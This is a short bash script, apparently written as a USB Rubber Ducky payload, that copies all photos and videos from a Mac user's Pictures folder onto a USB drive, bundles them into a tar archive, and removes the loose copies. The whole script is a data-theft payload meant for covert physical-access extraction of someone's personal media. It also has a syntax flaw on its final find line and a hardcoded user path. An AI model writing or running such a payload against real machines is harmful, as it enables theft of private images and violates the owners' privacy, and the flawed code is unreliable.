#!/bin/bash

# Mac Extract - Apple media Extractor Rubber Ducky
# Author: Artemis O. Solomon
# Description: Bash Script to extract photos and videos from a Mac to a USB
# Version: 1.0

# Define variables
  SOURCE="/Users/MacUser/Pictures/"
  DESTINATION="/Volumes/USB/"

# Change directories
  cd $SOURCE

# Copy and extract all photos and videos
  find . -iname \*.jpg -exec cp {} $DESTINATION \;
  find . -iname \*.png -exec cp {} $DESTINATION \;
  find . -iname \*.jpeg -exec cp {} $DESTINATION \;
  find . -iname \*.mp4 -exec cp {} $DESTINATION \;
  find . -iname \*.mov -exec cp {} $DESTINATION\;

# Compress all files
  cd $DESTINATION
  tar -cf photos_and_videos.tar *.jpg *.png *.jpeg *.mp4 *.mov

# Remove non compressed files
  rm *.jpg *.png *.jpeg *.mp4 *.mov

# The End
